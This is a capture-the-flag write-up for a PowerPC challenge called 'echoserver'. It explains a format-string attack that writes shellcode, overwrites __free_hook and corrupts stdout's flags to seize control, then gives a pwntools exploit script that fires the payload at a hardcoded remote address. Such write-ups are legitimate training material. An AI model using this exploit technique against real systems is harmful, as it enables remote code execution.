# echoserver

- A powerpc exploitation challenge.
- This is first time i worked on ppc exploit
- There is an obvious format string bug.
- But it directly calls exit with syscall. and the author clears all of the stack. so we can't look for the partial overwrites.
- The challenge binary is statically linked which means all of the address are known. To control the pc register. I first overwrite `__free_hook` to address of where i store my shellcode using format string bug. 
- Then i corrupted the stdout_struct->flags. Printf will do free when we corrupt stdout->flags. And we get pc control.
- The binary was stripped so to find `__free_hook` was a bit of labour work.
- 
	1. write shellcode using format string
	2. Overwrite `__free_hook` to call shellcode.
	3. Corrupt stdout->flags to cause free.
- (Qemu stack is executable)

# Exploit

```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random
context.arch='powerpc'

#Exploit
if __name__ == '__main__':
#	io = process(['/usr/bin/qemu-ppc','-g','1275','./pwn22_patch'])
	io = remote('150.158.156.120',23333)

	B_fsb = b'A%83$hnA%84$hn%85$hn%86$hnA%87$hnA%88$hnA%89$hn%95c%90$hn'+\
		'%1176c%91$hn%2830c%92$hn%1138c%93$hn%9092c%94$hn%95$hn%96$hn'+\
		'%96c%97$hn%98$hn%31c%99$hnA%100$hn%32c%101$hn%2912c%102$n%103$n'+\
		'%104$hn%1912c%105$hn%5615c%106$hn%1285c%107$hn%5843c%108$hn%453c%109$hn'+\
		'%110$hn%17524c%111$hn%112$hn.'+p32(0x100a14ae)+\p32(0x100a148e)+p32(0x100a14a2)+\
		p32(0x100a14b2)+p32(0x100a1492)+p32(0x100a14a6)+p32(0x100a1486)+\
		p32(0x100a149a)+p32(0x100a1482)+p32(0x100a0eb4)+p32(0x100a0eb6)+\
		p32(0x100a1484)+p32(0x100a1490)+p32(0x100a14a4)+p32(0x100a149c)+\
		p32(0x100a14ac)+p32(0x100a1480)+p32(0x100a1488)+p32(0x100a1498)+\
		p32(0x100a148a)+p32(0x100a149e)+p32(0x100a14b0)+p32(0x100a147e)+p32(0x100a197a)+\
		p32(0x100a1978)+p32(0x100a147c)+p32(0x100a1494)+p32(0x100a14a8)+p32(0x100a1496)+\
		p32(0x100a14aa)

	io.sendafter('launch......\n',B_fsb)
	io.interactive()
```
